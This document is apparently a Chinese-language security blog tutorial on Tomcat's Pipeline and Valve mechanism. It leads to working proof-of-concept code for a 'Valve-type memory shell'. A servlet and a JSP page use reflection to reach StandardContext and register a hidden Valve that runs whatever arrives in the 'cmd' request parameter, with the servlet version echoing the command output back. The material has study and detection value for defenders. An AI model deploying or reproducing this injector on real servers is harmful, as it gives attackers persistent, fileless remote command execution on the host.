---
title: Java 内存马之 Valve 型内存马
date: 2026-10-22
---

# Java 内存马之 Valve 型内存马

## Valve 是什么

在了解 Valve 之前，得先了解一下 Tomcat 中的管道机制。

当 Tomcat 接收到客户端请求时，首先会使用`Connector`进行解析，然后发送到`Container`进行处理。那么我们的消息是怎么在四类子容器中层层传递，最终到达 Servlet 进行处理的？这里就涉及到 Tomcat 管道机制。

管道机制主要涉及两个名词，`Pipeline`（管道）和`Valve`（阀门）。如果我们把请求比作管道中的水，那么阀门就可以用来在管道中实现各种功能，比如控制流速等。

因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。简单来说就是通过管道和阀门这种模式，我们可以通过调整阀门来实现不同的业务。

`Pipeline`中会有一个最基础的`Valve`，这个`Valve`也叫 basic，它始终位于末端（最后执行），它在业务上面的表现是封装了具体的请求处理和输出响应。

`Pipeline`提供了`addValve()`方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。

> 这么看着和 Filter 差不多，我们可以在 FilterChain 中添加任意 Filter，那么 Valve 也就是可以在 Pipeline 中任意添加。

看一下 Pipeline 发挥功能的原理图：

![](https://drun1baby.top/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Working.png)

在 Tomcat 中，四大组件 Engine、Host、Context 以及 Wrapper 都有其对应的 Valve 类，`StandardEngineValve`、`StandardHostValve`、`StandardContextValve`以及`StandardWrapperValve`，它们同时维护一个`StandardPipeline`实例。

下面的 basic 就是前面最基础的 Valve。

![](https://drun1baby.top/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getPipeline.png)

这是获取 HTTP 请求的阶段，也就是这个里面，我们获取到了`Pipeline`，并且能够很清楚的看到`Pipeline`里面有一个 basic，这个 basic 就是`StandardEngineValve`实例。

## Valve 内存马流程

### 内存马流程

Valve 可以被添加进`Pipeline`的流程之后，这里尝试实现一下。

先实现基础的 Valve：

```java
package tomcatShell.valve;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import java.io.IOException;

public class ValveTest extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        System.out.println("Valve 被成功调用");
    }
}
```

我们还需要通过`addValve()`方法把它添加进去，不然这个 Valve 就无法生效。而我们只要把我们自己写的恶意 Valve 添加进去，就可以造成恶意马的写入了。

先点进去`Pipeline`接口看一下，因为 Valve 是`Pipeline`的一部分，所以我们点进去看看。

![](https://drun1baby.top/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Pipeline.png)

在`Pipeline`接口中存在`addValve()`方法，顾名思义，我们可以通过这个方法把 Valve 添加进去。

`addValve()`方法对应的实现类是`StandardPipeline`，但是我们是无法直接获取到`StandardPipeline`的，所以这里去找一下`StandardContext`中有没有获取到`StandardPipeline`的方法。

![](https://drun1baby.top/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/AboutPipeline.png)

找到有`getPipeline()`，跟进去看一下。

![](https://drun1baby.top/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getPipelineReview.png)

注释里写着，这里返回一个`Pipeline`类型的对象，它是用来管理 Valves 的，所以这个语句等价于`StandardContext.getPipeline = StandardPipeline`。

所以我们可以得到这样的攻击思路：

- 先获取`StandardContext`
- 编写恶意 Valve
- 通过`StandardContext.getPipeline().addValve()`添加恶意 Valve

### Valve 型内存马应该在何处被加载

整体的思路是没什么问题了，但是有一个问题，我们的 Valve 是应该放到 Filter、Listener 还是 Servlet 里面。

其实是放在 Servlet 中，因为 Servlet 内存马中的`HTTP11Processor`的加载 HTTP 请求当中，是出现了`Pipeline`的 basic 的。所以我们通过 Servlet 来加载。

## POC 编写

我们需要定义一个`doGet()`方法，因为我们是发出 GET 请求，通过`doGet()`方法获取到 request 对象。

```java
package tomcatShell.valve;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

@WebServlet("/servlet")
public class ValveShell_Servlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Field fieldReq = req.getClass().getDeclaredField("request");
            fieldReq.setAccessible(true);
            Request request = (Request)fieldReq.get(req);
            StandardContext context = (StandardContext) request.getContext();
            context.getPipeline().addValve(new ValveBase() {
                @Override
                public void invoke(Request request, Response response) throws IOException, ServletException {
                    try {
                        String cmd = request.getParameter("cmd");

                        if (cmd != null) {
                            java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                            byte[] buf = new byte[1024];
                            int len;
                            while ((len = in.read(buf)) != -1) {
                                response.getWriter().write(new String(buf, 0, len));
                            }

                            return;
                        }
                    } catch (Exception e) {

                    }

                    getNext().invoke(request, response);
                }
            });
            resp.getWriter().write("inject success");
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
}
```

JSP 版本：

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
<%@ page import="org.apache.catalina.core.StandardContext" %>  
<%@ page import="javax.servlet.*" %>  
<%@ page import="javax.servlet.annotation.WebServlet" %>  
<%@ page import="javax.servlet.http.HttpServlet" %>  
<%@ page import="javax.servlet.http.HttpServletRequest" %>  
<%@ page import="javax.servlet.http.HttpServletResponse" %>  
<%@ page import="java.io.IOException" %>  
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="org.apache.catalina.Wrapper" %>  
<%@ page import="org.apache.catalina.connector.Request" %>  
<%@ page import="org.apache.catalina.valves.ValveBase" %>  
<%@ page import="org.apache.catalina.connector.Response" %>  
  
<%  
 class EvilValve extends ValveBase {  
  
 @Override  
 public void invoke(Request request, Response response) throws IOException, ServletException {  
 System.out.println("111");  
 try {  
 Runtime.getRuntime().exec(request.getParameter("cmd"));  
 } catch (Exception e) {  
  
 } } }%>  
  
<%  
 // 更简单的方法 获取StandardContext  
 Field reqF = request.getClass().getDeclaredField("request");  
 reqF.setAccessible(true);  
 Request req = (Request) reqF.get(request);  
 StandardContext standardContext = (StandardContext) req.getContext();  
  
 standardContext.getPipeline().addValve(new EvilValve());  
  
 out.println("inject success");  
%>
```





































